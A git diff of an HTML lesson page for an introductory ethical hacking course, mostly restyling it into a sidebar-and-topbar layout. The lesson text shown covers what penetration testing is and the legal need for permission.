@@ -3,236 +3,279 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Week 1 — Ethical Hacking | TechCamp</title>
+<title>Ethical Hacking — TechCamp</title>
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Exo+2:wght@300;400;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 <style>
-  :root { --sky:#0ea5e9; --sky-l:#38bdf8; --sky-p:#7dd3fc; --dark:#020e2e; --red:#ef4444; }
+  :root { --sky:#0ea5e9; --sky-l:#38bdf8; --sky-p:#7dd3fc; --dark:#020e2e; --red:#ef4444; --sidebar:380px; }
   * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:var(--dark); font-family:'Exo 2',sans-serif; color:#fff; min-height:100vh; }
+  body { background:#0b1120; font-family:'Exo 2',sans-serif; color:#fff; min-height:100vh; overflow-x:hidden; }
 
-  .grid-bg {
-    position:fixed; inset:0; z-index:0; pointer-events:none;
-    background-image:linear-gradient(rgba(14,165,233,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(14,165,233,0.04) 1px,transparent 1px);
-    background-size:40px 40px;
+  /* ── TOP BAR ─────────────────────────────────── */
+  .topbar { position:fixed; top:0; left:0; right:0; z-index:1000; height:56px; background:#1c1d1f; border-bottom:1px solid rgba(255,255,255,0.1); display:flex; align-items:center; justify-content:space-between; padding:0 16px; gap:12px; }
+  .topbar-left { display:flex; align-items:center; gap:12px; flex-shrink:0; min-width:0; }
+  .topbar-logo { font-family:'Orbitron',monospace; font-size:15px; font-weight:900; color:#fff; white-space:nowrap; }
+  .topbar-logo span { color:#a78bfa; }
+  .topbar-divider { width:1px; height:22px; background:rgba(255,255,255,0.15); flex-shrink:0; }
+  .topbar-course { font-size:12px; font-weight:600; color:rgba(255,255,255,0.75); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:260px; }
+  .topbar-back { display:flex; align-items:center; gap:5px; text-decoration:none; font-size:11px; font-weight:600; color:rgba(255,255,255,0.5); background:rgba(255,255,255,0.07); border:1px solid rgba(255,255,255,0.12); border-radius:5px; padding:5px 10px; white-space:nowrap; flex-shrink:0; }
+  .topbar-back:hover { color:#fff; }
+  .topbar-right { display:flex; align-items:center; gap:10px; flex-shrink:0; }
+  .progress-circle-wrap { display:flex; align-items:center; gap:9px; }
+  .progress-circle { position:relative; width:38px; height:38px; flex-shrink:0; }
+  .progress-circle svg { transform:rotate(-90deg); }
+  .progress-circle-bg { fill:none; stroke:rgba(255,255,255,0.12); stroke-width:3.5; }
+  .progress-circle-ring { fill:none; stroke:url(#pgGrad); stroke-width:3.5; stroke-linecap:round; transition:stroke-dashoffset 0.6s ease; }
+  .progress-circle-pct { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; font-family:'Orbitron',monospace; font-size:8px; font-weight:700; color:#fff; }
+  .progress-circle-label { display:flex; flex-direction:column; }
+  .pcl-main { font-size:11px; font-weight:700; color:#fff; }
+  .pcl-sub { font-size:9px; color:rgba(255,255,255,0.38); margin-top:1px; }
+  .tb-cert { display:inline-flex; align-items:center; gap:6px; background:#7c3aed; border:none; border-radius:5px; padding:7px 14px; font-family:'Exo 2',sans-serif; font-size:11px; font-weight:700; color:#fff; cursor:pointer; white-space:nowrap; text-decoration:none; }
+  .tb-cert:hover { background:#6d28d9; }
+  .tb-name { font-size:11px; font-weight:700; color:rgba(255,255,255,0.55); white-space:nowrap; }
+  .tb-signout { background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.3); border-radius:5px; padding:6px 11px; font-family:'Exo 2',sans-serif; font-size:11px; font-weight:700; color:#fca5a5; cursor:pointer; white-space:nowrap; }
+  .tb-signout:hover { background:rgba(239,68,68,0.25); }
+  .sidebar-toggle { display:none; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:5px; padding:7px 10px; font-size:14px; cursor:pointer; color:#fff; flex-shrink:0; }
+
+  /* ── MAIN LAYOUT ─────────────────────────────── */
+  .udemy-wrap { display:flex; padding-top:56px; min-height:100vh; }
+  .content-panel { flex:1; min-width:0; padding:36px 44px 60px; margin-right:var(--sidebar); background:#0b1120; }
+
+  /* ── SIDEBAR ─────────────────────────────────── */
+  .sidebar { position:fixed; top:56px; right:0; bottom:0; width:var(--sidebar); background:#1c1d1f; border-left:1px solid rgba(255,255,255,0.08); overflow-y:auto; z-index:100; transition:transform 0.3s; display:flex; flex-direction:column; }
+  .sidebar::-webkit-scrollbar { width:5px; }
+  .sidebar::-webkit-scrollbar-track { background:#1c1d1f; }
+  .sidebar::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.2); border-radius:3px; }
+  .sidebar-hdr { padding:16px 20px 12px; border-bottom:1px solid rgba(255,255,255,0.08); position:sticky; top:0; background:#1c1d1f; z-index:2; flex-shrink:0; }
+  .sidebar-hdr-title { font-size:15px; font-weight:800; color:#fff; }
+  .sidebar-hdr-sub { font-size:10px; color:rgba(255,255,255,0.4); margin-top:3px; }
+  .sidebar-progress { padding:12px 20px; background:#2d2f31; border-bottom:1px solid rgba(255,255,255,0.06); flex-shrink:0; }
+  .sp-row { display:flex; justify-content:space-between; align-items:center; margin-bottom:6px; }
+  .sp-label { font-size:10px; font-weight:600; color:rgba(255,255,255,0.55); }
+  .sp-pct { font-size:10px; font-weight:700; color:#a78bfa; }
+  .sp-bar { height:4px; background:rgba(255,255,255,0.1); border-radius:2px; overflow:hidden; }
+  .sp-fill { height:100%; background:linear-gradient(90deg,#7c3aed,#38bdf8); border-radius:2px; width:0%; transition:width 0.5s; }
+  .curr-section { border-bottom:1px solid rgba(255,255,255,0.05); }
+  .curr-section-hdr { display:flex; align-items:flex-start; justify-content:space-between; padding:14px 20px; cursor:pointer; background:#2d2f31; transition:background 0.15s; user-select:none; }
+  .curr-section-hdr:hover { background:#333436; }
+  .curr-section-hdr.active { background:#2d2f31; border-left:3px solid #a78bfa; }
+  .curr-section-info { flex:1; padding-right:8px; }
+  .curr-section-title { font-size:12px; font-weight:700; color:#fff; line-height:1.4; margin-bottom:3px; }
+  .curr-section-meta { font-size:10px; color:rgba(255,255,255,0.38); }
+  .curr-chevron { font-size:10px; color:rgba(255,255,255,0.45); margin-top:3px; flex-shrink:0; transition:transform 0.2s; }
+  .curr-chevron.open { transform:rotate(180deg); }
+  .curr-lessons { display:none; background:#1c1d1f; }
+  .curr-lessons.open { display:block; }
+  .curr-item { display:flex; align-items:flex-start; gap:10px; padding:10px 20px 10px 24px; cursor:pointer; transition:background 0.12s; border-left:3px solid transparent; }
+  .curr-item:hover { background:rgba(255,255,255,0.04); }
+  .curr-item.active { background:rgba(167,139,250,0.09); border-left-color:#a78bfa; }
+  .curr-check { width:18px; height:18px; border-radius:50%; border:1.5px solid rgba(255,255,255,0.22); display:flex; align-items:center; justify-content:center; flex-shrink:0; margin-top:2px; font-size:9px; transition:all 0.2s; color:transparent; }
+  .curr-check.done { background:#22c55e; border-color:#22c55e; color:#fff; }
+  .curr-check.active { border-color:#a78bfa; color:#a78bfa; }
+  .curr-item-text { flex:1; }
+  .curr-item-title { font-size:11.5px; color:rgba(255,255,255,0.72); line-height:1.45; }
+  .curr-item.active .curr-item-title { color:#fff; font-weight:600; }
+  .curr-item-dur { font-size:9.5px; color:rgba(255,255,255,0.3); margin-top:3px; }
+
+  @media(max-width:960px) {
+    :root { --sidebar:0px; }
+    .content-panel { margin-right:0; padding:22px 18px 60px; }
+    .sidebar { transform:translateX(100%); width:340px; }
+    .sidebar.open { transform:translateX(0); }
+    .sidebar-toggle { display:flex; }
+    .topbar-course { display:none; }
   }
-  .blob { position:fixed; border-radius:50%; filter:blur(90px); pointer-events:none; z-index:0; }
-  .b1 { width:350px;height:350px; background:rgba(239,68,68,0.12); top:-80px; right:-80px; }
-  .b2 { width:300px;height:300px; background:rgba(14,165,233,0.1); bottom:0; left:-60px; }
-
-  .wrap { position:relative; z-index:1; max-width:720px; margin:0 auto; padding:30px 18px 70px; }
-
-  /* NAV */
-  .nav { display:flex; align-items:center; justify-content:space-between; margin-bottom:32px; }
-  .nav a { text-decoration:none; color:var(--sky-p); font-size:12px; font-weight:700; letter-spacing:1px; }
-  .week-badge {
-    background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.4);
-    color:#fca5a5; font-size:10px; font-weight:700; letter-spacing:2px;
-    text-transform:uppercase; padding:6px 14px; border-radius:50px;
+  @media(max-width:560px) {
+    .tb-name { display:none; }
+    .progress-circle-label { display:none; }
   }
 
-  /* HERO */
-  .hero { text-align:center; margin-bottom:40px; }
-  .hero-icon { font-size:52px; margin-bottom:12px; filter:drop-shadow(0 0 20px rgba(239,68,68,0.5)); }
-  .hero-title { font-family:'Orbitron',monospace; font-weight:900; font-size:28px; color:#fff; text-shadow:0 0 30px rgba(239,68,68,0.4); margin-bottom:8px; }
-  .hero-sub { font-size:13px; font-weight:300; color:rgba(255,255,255,0.5); line-height:1.7; }
-  .hero-dates { display:inline-block; margin-top:12px; background:rgba(239,68,68,0.12); border:1px solid rgba(239,68,68,0.3); border-radius:50px; padding:6px 16px; font-size:11px; font-weight:700; color:#fca5a5; letter-spacing:2px; }
-
-  /* PROGRESS */
-  .progress-strip { display:flex; gap:6px; margin-bottom:36px; }
-  .p-day {
-    flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1);
-    border-radius:8px; padding:10px 6px; text-align:center; cursor:pointer; transition:all 0.2s;
-  }
-  .p-day.active { background:rgba(239,68,68,0.2); border-color:rgba(239,68,68,0.5); }
-  .p-day:hover { background:rgba(255,255,255,0.1); }
-  .p-num { font-family:'Orbitron',monospace; font-size:14px; font-weight:700; color:#fff; }
-  .p-label { font-size:8px; color:rgba(255,255,255,0.4); letter-spacing:1px; margin-top:3px; }
-
-  /* LESSON SECTIONS */
+    /* ── CONTENT AREA STYLES ─────────────────────── */
   .lesson { display:none; }
   .lesson.active { display:block; }
 
-  /* SLIDE */
+  /* Week header inside content */
+  .week-header { margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid rgba(255,255,255,0.07); }
+  .wh-badge { display:inline-flex; align-items:center; gap:6px; background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.3); border-radius:20px; padding:4px 12px; font-size:9px; font-weight:700; letter-spacing:2px; color:#fca5a5; text-transform:uppercase; margin-bottom:10px; }
+  .wh-title { font-family:'Orbitron',monospace; font-size:22px; font-weight:900; color:#fff; margin-bottom:6px; }
+  .wh-sub { font-size:13px; color:rgba(255,255,255,0.45); line-height:1.6; }
+
+  /* Lesson header */
+  .lesson-header { margin-bottom:24px; padding:20px; background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.15); border-radius:14px; }
+  .lh-num { font-size:10px; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:rgba(239,68,68,0.7); margin-bottom:6px; }
+  .lh-title { font-size:20px; font-weight:800; color:#fff; line-height:1.3; }
+  .lh-desc { font-size:12px; color:rgba(255,255,255,0.45); margin-top:6px; line-height:1.6; }
+
+  /* ── SLIDE (keep existing + tweak) ──────────────*/
+  .grid-bg { display:none; } /* hide on new layout */
+  .blob { display:none; }
+
   .slide {
-    background:linear-gradient(135deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
-    border:1px solid rgba(125,211,252,0.15); border-radius:16px;
-    padding:28px 24px; margin-bottom:20px; position:relative; overflow:hidden;
+    background:linear-gradient(135deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02));
+    border:1px solid rgba(125,211,252,0.12); border-radius:14px;
+    padding:26px 22px; margin-bottom:16px; position:relative; overflow:hidden;
   }
-  .slide::before {
-    content:''; position:absolute; top:0; left:0; right:0; height:3px;
-    background:linear-gradient(90deg,var(--red),var(--sky));
-  }
-  .slide-num {
-    position:absolute; top:16px; right:18px;
-    font-family:'Orbitron',monospace; font-size:11px; font-weight:700;
-    color:rgba(255,255,255,0.12); letter-spacing:1px;
-  }
+  .slide::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--red),var(--sky)); }
+  .slide-num { position:absolute; top:14px; right:16px; font-family:'Orbitron',monospace; font-size:10px; font-weight:700; color:rgba(255,255,255,0.1); letter-spacing:1px; }
   .slide-tag { font-size:9px; font-weight:700; letter-spacing:3px; text-transform:uppercase; color:var(--sky-p); margin-bottom:10px; }
-  .slide-title { font-size:20px; font-weight:800; color:#fff; margin-bottom:14px; line-height:1.3; }
-  .slide-body { font-size:13.5px; font-weight:400; color:rgba(255,255,255,0.7); line-height:1.8; }
+  .slide-title { font-size:19px; font-weight:800; color:#fff; margin-bottom:12px; line-height:1.3; }
+  .slide-body { font-size:13px; color:rgba(255,255,255,0.7); line-height:1.8; }
   .slide-body p { margin-bottom:10px; }
   .slide-body strong { color:#fff; font-weight:700; }
 
-  /* VISUAL CARDS inside slides */
-  .vis-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:16px; }
-  .vis-card {
-    background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.12);
-    border-radius:10px; padding:14px; text-align:center;
-  }
-  .vis-icon { font-size:28px; margin-bottom:6px; filter:drop-shadow(0 0 6px rgba(125,211,252,0.4)); }
+  /* circuit / diagram box */
+  .circuit-box { background:#060d1f; border:1px solid rgba(14,165,233,0.2); border-radius:12px; padding:16px; margin:14px 0; }
+  .circuit-title { font-size:9px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:rgba(125,211,252,0.5); margin-bottom:12px; }
+  .circuit-diagram { font-family:'Fira Code',monospace; font-size:11.5px; line-height:2; color:#94a3b8; }
+  .circuit-diagram .pwr { color:#ef4444; }
+  .circuit-diagram .gnd { color:#64748b; }
+  .circuit-diagram .sig { color:#38bdf8; }
+  .circuit-diagram .comp { color:#f97316; }
+  .circuit-diagram .note { color:#64748b; }
+  .circuit-diagram .wire { color:#475569; }
+  .circuit-diagram .pin { color:#a78bfa; }
+  .circuit-diagram .num { color:#f472b6; }
+  .circuit-diagram .str { color:#86efac; }
+  .circuit-diagram .teal-p { color:#67e8f9; }
+
+  /* VISUAL CARDS */
+  .vis-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:14px; }
+  .vis-card { background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.12); border-radius:10px; padding:14px; text-align:center; }
+  .vis-icon { font-size:28px; margin-bottom:6px; }
   .vis-label { font-size:12px; font-weight:700; color:#fff; margin-bottom:3px; }
   .vis-desc { font-size:10px; color:rgba(255,255,255,0.45); font-weight:300; line-height:1.4; }
 
-  /* CODE BLOCK */
-  .code-block {
-    background:#0a0f1e; border:1px solid rgba(125,211,252,0.2);
-    border-radius:10px; padding:18px; margin:14px 0; overflow-x:auto;
-  }
-  .code-block pre { font-family:'Fira Code',monospace; font-size:12px; color:#e2e8f0; line-height:1.7; white-space:pre; }
+  /* CODE */
+  .code-block { background:#060d1f; border:1px solid rgba(125,211,252,0.18); border-radius:10px; padding:16px; margin:12px 0; overflow-x:auto; }
+  .code-block pre { font-family:'Fira Code',monospace; font-size:12px; color:#e2e8f0; line-height:1.75; white-space:pre; }
   .code-block .kw { color:#38bdf8; }
   .code-block .str { color:#86efac; }
-  .code-block .cm { color:#64748b; }
-  .code-lang { font-size:9px; font-weight:700; letter-spacing:2px; color:var(--sky-p); margin-bottom:8px; text-transform:uppercase; }
+  .code-block .cm { color:#475569; }
+  .code-block .num { color:#f472b6; }
+  .code-block .fn { color:#60a5fa; }
+  .code-lang { font-size:9px; font-weight:700; letter-spacing:2px; color:var(--sky-p); margin-bottom:6px; text-transform:uppercase; }
 
   /* STEPS */
-  .steps { display:flex; flex-direction:column; gap:10px; margin-top:14px; }
-  .step { display:flex; gap:14px; align-items:flex-start; }
-  .step-num {
-    width:28px; height:28px; border-radius:50%; flex-shrink:0;
-    background:rgba(239,68,68,0.2); border:1px solid rgba(239,68,68,0.4);
-    display:flex; align-items:center; justify-content:center;
-    font-family:'Orbitron',monospace; font-size:11px; font-weight:700; color:#fca5a5;
-  }
-  .step-text { font-size:13px; color:rgba(255,255,255,0.7); line-height:1.6; padding-top:4px; }
+  .steps { display:flex; flex-direction:column; gap:10px; margin-top:12px; }
+  .step { display:flex; gap:12px; align-items:flex-start; }
+  .step-num { width:26px; height:26px; border-radius:50%; flex-shrink:0; background:rgba(239,68,68,0.18); border:1px solid rgba(239,68,68,0.4); display:flex; align-items:center; justify-content:center; font-family:'Orbitron',monospace; font-size:10px; font-weight:700; color:#fca5a5; }
+  .step-text { font-size:12.5px; color:rgba(255,255,255,0.7); line-height:1.6; padding-top:3px; }
   .step-text strong { color:#fff; }
 
-  /* KEY TERMS */
-  .terms-grid { display:flex; flex-direction:column; gap:8px; margin-top:14px; }
-  .term {
-    background:rgba(255,255,255,0.04); border-left:3px solid var(--sky);
-    border-radius:0 8px 8px 0; padding:10px 14px;
-  }
-  .term-word { font-size:13px; font-weight:700; color:var(--sky-l); margin-bottom:2px; }
-  .term-def { font-size:11.5px; color:rgba(255,255,255,0.6); line-height:1.5; }
+  /* TERMS */
+  .terms-grid { display:flex; flex-direction:column; gap:7px; margin-top:12px; }
+  .term { background:rgba(255,255,255,0.04); border-left:3px solid var(--sky); border-radius:0 8px 8px 0; padding:9px 12px; }
+  .term-word { font-size:12.5px; font-weight:700; color:var(--sky-l); margin-bottom:2px; }
+  .term-def { font-size:11px; color:rgba(255,255,255,0.6); line-height:1.5; }
 
-  /* WARNING BOX */
-  .warn-box {
-    background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.3);
-    border-radius:10px; padding:14px 16px; margin-top:14px;
-    display:flex; gap:10px; align-items:flex-start;
-  }
-  .warn-icon { font-size:18px; flex-shrink:0; }
-  .warn-text { font-size:12px; color:rgba(255,165,165,0.85); line-height:1.6; }
+  /* WARN / TIP */
+  .warn-box { background:rgba(239,68,68,0.08); border:1px solid rgba(239,68,68,0.28); border-radius:10px; padding:12px 14px; margin-top:12px; display:flex; gap:10px; align-items:flex-start; }
+  .warn-icon { font-size:16px; flex-shrink:0; }
+  .warn-text { font-size:11.5px; color:rgba(255,165,165,0.85); line-height:1.6; }
+  .tip-box { background:rgba(14,165,233,0.07); border:1px solid rgba(14,165,233,0.22); border-radius:10px; padding:12px 14px; margin-top:12px; display:flex; gap:10px; align-items:flex-start; }
+  .tip-icon { font-size:16px; flex-shrink:0; }
+  .tip-text { font-size:11.5px; color:rgba(125,211,252,0.85); line-height:1.6; }
 
-  /* TIP BOX */
-  .tip-box {
-    background:rgba(14,165,233,0.08); border:1px solid rgba(14,165,233,0.25);
-    border-radius:10px; padding:14px 16px; margin-top:14px;
-    display:flex; gap:10px; align-items:flex-start;
-  }
-  .tip-icon { font-size:18px; flex-shrink:0; }
-  .tip-text { font-size:12px; color:rgba(125,211,252,0.85); line-height:1.6; }
-
-  /* DOWNLOAD / LINK CARD */
-  .link-card {
-    background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.2);
-    border-radius:10px; padding:14px 16px; margin-bottom:10px;
-    display:flex; align-items:center; gap:12px; text-decoration:none;
-  }
+  /* LINK CARD */
+  .link-card { background:rgba(255,255,255,0.05); border:1px solid rgba(125,211,252,0.18); border-radius:10px; padding:12px 14px; margin-bottom:8px; display:flex; align-items:center; gap:10px; text-decoration:none; transition:background 0.15s; }
   .link-card:hover { background:rgba(255,255,255,0.09); }
-  .link-icon { font-size:22px; flex-shrink:0; }
+  .link-icon { font-size:20px; flex-shrink:0; }
   .link-info { flex:1; }
-  .link-title { font-size:13px; font-weight:700; color:#fff; }
-  .link-url { font-size:10px; color:rgba(125,211,252,0.6); margin-top:2px; }
-  .link-arr { color:rgba(125,211,252,0.4); font-size:18px; }
+  .link-title { font-size:12.5px; font-weight:700; color:#fff; }
+  .link-url { font-size:10px; color:rgba(125,211,252,0.55); margin-top:2px; }
+  .link-arr { color:rgba(125,211,252,0.35); font-size:16px; }
 
-  /* DIAGRAM — network visual */
-  .diagram {
-    background:#0a0f1e; border:1px solid rgba(125,211,252,0.15);
-    border-radius:12px; padding:20px; margin:14px 0; text-align:center;
-  }
-  .diag-row { display:flex; align-items:center; justify-content:center; gap:6px; margin:6px 0; flex-wrap:wrap; }
-  .diag-node {
-    background:rgba(14,165,233,0.15); border:1px solid rgba(14,165,233,0.35);
-    border-radius:8px; padding:8px 12px; font-size:11px; font-weight:700; color:#7dd3fc;
-    white-space:nowrap;
-  }
+  /* DIAGRAM */
+  .diagram { background:#060d1f; border:1px solid rgba(125,211,252,0.15); border-radius:12px; padding:18px; margin:12px 0; text-align:center; }
+  .diag-row { display:flex; align-items:center; justify-content:center; gap:6px; margin:5px 0; flex-wrap:wrap; }
+  .diag-node { background:rgba(14,165,233,0.15); border:1px solid rgba(14,165,233,0.35); border-radius:8px; padding:7px 11px; font-size:10.5px; font-weight:700; color:#7dd3fc; white-space:nowrap; }
   .diag-node.red { background:rgba(239,68,68,0.15); border-color:rgba(239,68,68,0.35); color:#fca5a5; }
   .diag-node.green { background:rgba(34,197,94,0.15); border-color:rgba(34,197,94,0.35); color:#86efac; }
-  .diag-arrow { color:rgba(255,255,255,0.3); font-size:18px; }
-  .diag-label { font-size:9px; color:rgba(255,255,255,0.35); letter-spacing:2px; text-transform:uppercase; margin-bottom:12px; }
+  .diag-arrow { color:rgba(255,255,255,0.3); font-size:16px; }
+  .diag-label { font-size:9px; color:rgba(255,255,255,0.3); letter-spacing:2px; text-transform:uppercase; margin-bottom:10px; }
 
-  /* SCREENSHOT BOX */
-  .screenshot-box {
-    background:#0a0f1e; border:1px solid rgba(125,211,252,0.2);
-    border-radius:10px; padding:16px; margin:14px 0;
-  }
-  .ss-label { font-size:9px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:rgba(125,211,252,0.5); margin-bottom:10px; }
-  .ss-content { display:flex; flex-direction:column; gap:6px; }
+  /* SCREENSHOT */
+  .screenshot-box { background:#060d1f; border:1px solid rgba(125,211,252,0.18); border-radius:10px; padding:14px; margin:12px 0; }
+  .ss-label { font-size:9px; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:rgba(125,211,252,0.45); margin-bottom:8px; }
+  .ss-content { display:flex; flex-direction:column; gap:5px; }
   .ss-row { display:flex; gap:10px; align-items:flex-start; flex-wrap:wrap; }
   .ss-path { font-family:'Fira Code',monospace; font-size:11px; color:#38bdf8; flex-shrink:0; }
   .ss-desc { font-size:11px; color:rgba(255,255,255,0.5); line-height:1.5; }
 
   /* NAV BUTTONS */
-  .lesson-nav { display:flex; gap:10px; margin-top:28px; }
-  .nav-btn {
-    flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(125,211,252,0.2);
-    border-radius:10px; padding:14px; text-align:center; cursor:pointer;
-    font-family:'Exo 2',sans-serif; font-size:13px; font-weight:700; color:#fff;
-    transition:all 0.2s;
-  }
-  .nav-btn:hover { background:rgba(255,255,255,0.12); }
-  .nav-btn.primary { background:rgba(14,165,233,0.2); border-color:rgba(14,165,233,0.4); }
+  .lesson-nav { display:flex; gap:10px; margin-top:28px; padding-top:20px; border-top:1px solid rgba(255,255,255,0.06); }
+  .nav-btn { flex:1; background:rgba(255,255,255,0.06); border:1px solid rgba(125,211,252,0.2); border-radius:10px; padding:13px; text-align:center; cursor:pointer; font-family:'Exo 2',sans-serif; font-size:13px; font-weight:700; color:#fff; transition:all 0.2s; }
+  .nav-btn:hover { background:rgba(255,255,255,0.1); }
+  .nav-btn.primary { background:rgba(14,165,233,0.18); border-color:rgba(14,165,233,0.4); }
 
-  footer { text-align:center; margin-top:40px; font-size:11px; color:rgba(255,255,255,0.2); }
+  footer { text-align:center; margin-top:32px; font-size:11px; color:rgba(255,255,255,0.18); }
+
+  /* ── RESPONSIVE ──────────────────────────────── */
+  @media(max-width:900px) {
+    :root { --sidebar:0px; }
+    .content-panel { margin-right:0; padding:20px 16px 60px; }
+    .sidebar { transform:translateX(100%); width:300px; }
+    .sidebar.open { transform:translateX(0); }
+    .sidebar-toggle { display:flex; }
+    .topbar-progress { display:none; }
+  }
+  @media(max-width:600px) {
+    .topbar-title { display:none; }
+    .topbar-badge { display:none; }
+    .tb-name { display:none; }
+  }
 </style>
 </head>
 <body>
 <script>if(sessionStorage.getItem("tc_auth")!=="true"){window.location.replace("index.html");}</script>
-<!-- FLOATING SIGN OUT BAR -->
-<div style="position:fixed;top:12px;right:12px;z-index:9999;display:flex;align-items:center;gap:8px;">
-  <div id="float-name" style="background:rgba(2,14,46,0.88);border:1px solid rgba(125,211,252,0.2);border-radius:10px;padding:7px 14px;font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;color:rgba(255,255,255,0.6);white-space:nowrap;">Student</div>
-  <button onclick="signOut()" style="background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:7px 12px;font-family:'Exo 2',sans-serif;font-size:11px;font-weight:700;color:#fca5a5;cursor:pointer;white-space:nowrap;">🚪 Sign Out</button>
-</div>
-<script>
-(function(){
-  var n = sessionStorage.getItem('tc_student') || 'Student';
-  var el = document.getElementById('float-name');
-  if(el) el.textContent = n;
-})();
-function signOut() {
-  if(confirm('Sign out of TechCamp portal?')) {
-    ['tc_auth','tc_student','tc_att','tc_lock'].forEach(function(k){ sessionStorage.removeItem(k); });
-    window.location.replace('index.html');
-  }
-}
-</script>
-<div class="grid-bg"></div>
-<div class="blob b1"></div>
-<div class="blob b2"></div>
 
-<div class="wrap">
-  <nav class="nav">
-    <a href="index.html">← Back to Hub</a>
-    <div class="week-badge">⚡ Week 1</div>
-  </nav>
-
-  <!-- HERO -->
-  <div class="hero">
-    <div class="hero-icon">🔐</div>
-    <div class="hero-title">Ethical Hacking Fundamentals</div>
-    <p class="hero-sub">Learn how hackers think — and how to defend against them.<br>We'll set up your hacking lab and explore real tools used by professionals.</p>
-    <div class="hero-dates">Apr 2 – Apr 8, 2026</div>
+<!-- ── TOP BAR ───────────────────────────────────────────── -->
+<div class="topbar">
+  <div class="topbar-left">
+    <button class="sidebar-toggle" onclick="toggleSidebar()">☰</button>
+    <a class="topbar-back" href="portal.html">← Hub</a>
+    <div class="topbar-divider"></div>
+    <div class="topbar-logo">TECH<span>CAMP</span></div>
+    <div class="topbar-divider"></div>
+    <div class="topbar-course">🔐 Ethical Hacking Fundamentals</div>
   </div>
+  <div class="topbar-right">
+    <!-- Circular progress -->
+    <div class="progress-circle-wrap">
+      <div class="progress-circle">
+        <svg width="38" height="38" viewBox="0 0 38 38">
+          <defs>
+            <linearGradient id="pgGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+              <stop offset="0%" style="stop-color:#7c3aed"/>
+              <stop offset="100%" style="stop-color:#38bdf8"/>
+            </linearGradient>
+          </defs>
+          <circle class="progress-circle-bg" cx="19" cy="19" r="16"/>
+          <circle class="progress-circle-ring" cx="19" cy="19" r="16"
+            stroke-dasharray="100.53" stroke-dashoffset="100.53" id="ring-fill"/>
+        </svg>
+        <div class="progress-circle-pct" id="ring-pct">0%</div>
+      </div>
+      <div class="progress-circle-label">
+        <div class="pcl-main" id="ring-day"> / 6</div>
+        <div class="pcl-sub">Your progress</div>
+      </div>
+    </div>
+    <a class="tb-cert" href="certificate.html">🎓 Certificate</a>
+    <div class="tb-name" id="tb-name">Student</div>
+    <button class="tb-signout" onclick="signOut()">🚪 Sign Out</button>
+  </div>
+</div>
 
-  <!-- DAY TABS -->
-  <div class="progress-strip">
-    <div class="p-day active" onclick="showDay(1)"><div class="p-num">1</div><div class="p-label">Day</div></div>
-    <div class="p-day" onclick="showDay(2)"><div class="p-num">2</div><div class="p-label">Day</div></div>
-    <div class="p-day" onclick="showDay(3)"><div class="p-num">3</div><div class="p-label">Day</div></div>
-    <div class="p-day" onclick="showDay(4)"><div class="p-num">4</div><div class="p-label">Day</div></div>
-    <div class="p-day" onclick="showDay(5)"><div class="p-num">5</div><div class="p-label">Day</div></div>
-    <div class="p-day" onclick="showDay(6)" style="background:rgba(239,68,68,0.08);border-color:rgba(239,68,68,0.3);"><div class="p-num" style="font-size:11px;">🌐</div><div class="p-label">Web</div></div>
+<!-- ── UDEMY LAYOUT ──────────────────────────────────────── -->
+<div class="udemy-wrap">
+
+<!-- ── LEFT: CONTENT PANEL ───────────────────────────────── -->
+<div class="content-panel">
+
+  <div class="week-header">
+    <div class="wh-badge">⚡ Ethical Hacking</div>
+    <div class="wh-title">Ethical Hacking Fundamentals</div>
+    <div class="wh-sub">Learn how hackers think — and how to defend against them. Set up your hacking lab and explore real tools used by security professionals.</div>
   </div>
 
   <!-- ===== DAY 1 ===== -->
@@ -240,7 +283,7 @@ function signOut() {
 
     <div class="slide">
       <div class="slide-num">01 / 04</div>
-      <div class="slide-tag">Day 1 · Introduction</div>
+      <div class="slide-tag">Introduction</div>
       <div class="slide-title">What is Ethical Hacking?</div>
       <div class="slide-body">
         <p>Ethical hacking — also called <strong>penetration testing</strong> — is the practice of intentionally trying to break into a computer system, network, or application <strong>with permission</strong>, in order to find weaknesses before malicious hackers do.</p>
@@ -272,7 +315,7 @@ function signOut() {
 
     <div class="slide">
       <div class="slide-num">02 / 04</div>
-      <div class="slide-tag">Day 1 · The Law</div>
+      <div class="slide-tag">The Law</div>
       <div class="slide-title">⚖️ Ethics & The Law — Very Important</div>
       <div class="slide-body">
         <p>Everything we learn in this course is for <strong>educational and defensive purposes only</strong>. Using these skills without permission is a criminal offence in Ghana and globally.</p>
@@ -290,7 +333,7 @@ function signOut() {
 
     <div class="slide">
       <div class="slide-num">03 / 04</div>
-      <div class="slide-tag">Day 1 · The Hacking Process</div>
+      <div class="slide-tag">The Hacking Process</div>
       <div class="slide-title">The 5 Phases of Ethical Hacking</div>
